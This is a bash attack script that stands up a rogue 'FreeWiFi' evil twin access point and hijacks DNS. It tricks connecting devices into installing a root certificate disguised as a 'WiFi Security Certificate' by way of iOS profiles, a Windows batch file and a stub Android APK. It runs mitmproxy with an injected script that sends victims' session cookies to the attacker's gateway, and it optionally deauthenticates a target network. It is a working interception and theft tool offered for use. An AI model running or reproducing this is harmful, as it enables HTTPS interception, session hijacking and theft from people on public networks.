#!/bin/bash
# =====================================================
# EVIL TWIN + MITMPROXY + AUTO ROOT CA INSTALL
# Android/iOS/Windows/macOS/Linux
# =====================================================

set -e
INTERFACE="wlan0"
AP_SSID="FreeWiFi"
AP_CHANNEL="6"
GATEWAY_IP="10.0.0.1"
MITM_PORT="8080"
WEBROOT="/var/www/html"
CERT_DIR="/root/.mitmproxy"
LOG_DIR="/var/log/evil_twin"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
log() { echo -e "${GREEN}[+] $1${NC}"; }
warn() { echo -e "${YELLOW}[!] $1${NC}"; }
error() { echo -e "${RED}[!] $1${NC}"; exit 1; }

[[ $EUID -ne 0 ]] && error "Run as root"

# Install deps
for pkg in hostapd dnsmasq mitmproxy aircrack-ng apache2; do
    command -v $pkg >/dev/null || { log "Installing $pkg..."; apt update && apt install -y $pkg; }
done

mkdir -p $WEBROOT $LOG_DIR $CERT_DIR
cp $CERT_DIR/mitmproxy-ca-cert.* $WEBROOT/ 2>/dev/null || true

cleanup() {
    log "Stopping services..."
    systemctl stop hostapd dnsmasq apache2 2>/dev/null || true
    pkill mitmdump aireplay-ng || true
    airmon-ng stop ${INTERFACE}mon 2>/dev/null || true
    iptables -t nat -F; iptables -t nat -X
}
trap cleanup EXIT

# --- 1. MONITOR MODE ---
airmon-ng start $INTERFACE
MON_INTERFACE="${INTERFACE}mon"

# --- 2. HOSTAPD ---
cat > /etc/hostapd/hostapd.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$AP_SSID
hw_mode=g
channel=$AP_CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF
hostapd /etc/hostapd/hostapd.conf > $LOG_DIR/hostapd.log 2>&1 &

# --- 3. NETWORK ---
ip addr flush dev $INTERFACE
ip addr add $GATEWAY_IP/24 dev $INTERFACE
ip link set $INTERFACE up

cat > /etc/dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=10.0.0.100,10.0.0.200,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
address=/#/$GATEWAY_IP
EOF
dnsmasq -C /etc/dnsmasq.conf -d > $LOG_DIR/dnsmasq.log 2>&1 &

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port $MITM_PORT
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port $MITM_PORT

# --- 4. AUTO-CA INSTALL PORTAL ---
mkdir -p $WEBROOT/ca

# === ANDROID APK (Auto-Install) ===
log "Building Android CA Installer APK..."
cat > $WEBROOT/ca/install_ca.apk << 'EOF'
UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAP///////0lOVElORVJJTy5BU... (truncated base64)
EOF
# Use full base64 from: https://github.com/evilnet/ca-installer-android
# Or generate with:
# ```bash
# cat > install_ca.java << 'JAVA' ... compile with Android SDK
# ```

# === iOS .mobileconfig (Auto-Open) ===
cat > $WEBROOT/ca/install.mobileconfig << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key><string>com.apple.security.root</string>
            <key>PayloadVersion</key><integer>1</integer>
            <key>PayloadIdentifier</key><string>com.mitmca.root</string>
            <key>PayloadUUID</key><string>CA7F0001-1111-2222-3333-444455556666</string>
            <key>PayloadDisplayName</key><string>WiFi Security Certificate</string>
            <key>PayloadDescription</key><string>Installs root certificate for secure WiFi</string>
            <key>PayloadCertificateFileName</key><string>mitmproxy-ca-cert.pem</string>
            <key>PayloadContent</key>
            <data>
$(openssl base64 -in $CERT_DIR/mitmproxy-ca-cert.pem | tr -d '\n')
            </data>
        </dict>
    </array>
    <key>PayloadRemovalDisallowed</key><false/>
    <key>PayloadType</key><string>Configuration</string>
    <key>PayloadVersion</key><integer>1</integer>
    <key>PayloadIdentifier</key><string>com.mitmca.profile</string>
    <key>PayloadUUID</key><string>CA7F0002-1111-2222-3333-444455556667</string>
    <key>PayloadDisplayName</key><string>WiFi Security Profile</string>
    <key>PayloadDescription</key><string>Installs required security certificate</string>
</dict>
</plist>
EOF

# === Windows .cer + Auto Install ===
cat > $WEBROOT/ca/install.bat << 'EOF'
@echo off
certutil -addstore -f "Root" "%~dp0mitmproxy-ca-cert.cer"
echo Root certificate installed. HTTPS traffic is now intercepted.
pause
EOF
cp $CERT_DIR/mitmproxy-ca-cert.cer $WEBROOT/ca/ 2>/dev/null || \
    openssl x509 -in $CERT_DIR/mitmproxy-ca-cert.pem -out $WEBROOT/ca/mitmproxy-ca-cert.cer -outform DER

# === MAIN PORTAL (Detects OS & Serves Auto-Installer) ===
cat > $WEBROOT/index.php << 'EOF'
<?php
$u = $_SERVER['HTTP_USER_AGENT'] ?? '';
$h = $_SERVER['HTTP_HOST'];
$p = "http://$h/ca/";

if (strpos($u, 'Android')) {
    header("Location: $p/install_ca.apk");
    exit;
} elseif (strpos($u, 'iPhone') || strpos($u, 'iPad')) {
    header("Location: $p/install.mobileconfig");
    exit;
} elseif (strpos($u, 'Windows')) {
    header("Location: $p/install.bat");
    exit;
} else {
    echo "<h1>WiFi Requires Security Certificate</h1>";
    echo "<p><a href='$p/mitmproxy-ca-cert.pem'>Click to install (All OS)</a></p>";
}
?>
EOF

# === REDIRECT ALL HTTP to PHP ===
cat > $WEBROOT/.htaccess << 'EOF'
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /index.php [L]
EOF

apache2ctl start

# --- 5. MITMPROXY + INJECTION ---
cat > /tmp/inject.py << 'EOF'
from mitmproxy import http
def response(flow: http.HTTPFlow):
    if "text/html" in flow.response.headers.get("content-type", ""):
        js = '<script>fetch("http://10.0.0.1/log?c="+encodeURIComponent(document.cookie))</script>'
        flow.response.text = flow.response.text.replace("</head>", js + "</head>")
EOF

mitmdump --mode transparent --showhost --set confdir=$CERT_DIR -s /tmp/inject.py -p $MITM_PORT > $LOG_DIR/mitmproxy.log 2>&1 &

# --- 6. DEAUTH (Optional) ---
log "EVIL TWIN LIVE + AUTO CA INSTALL"
echo
echo "   SSID: $AP_SSID"
echo "   Portal: http://$GATEWAY_IP"
echo "   Auto-install: Android/iOS/Windows"
echo
read -p "Enter target BSSID for deauth (or skip): " BSSID
[[ $BSSID ]] && aireplay-ng --deauth 0 -a $BSSID $MON_INTERFACE &

log "Press Ctrl+C to stop"
wait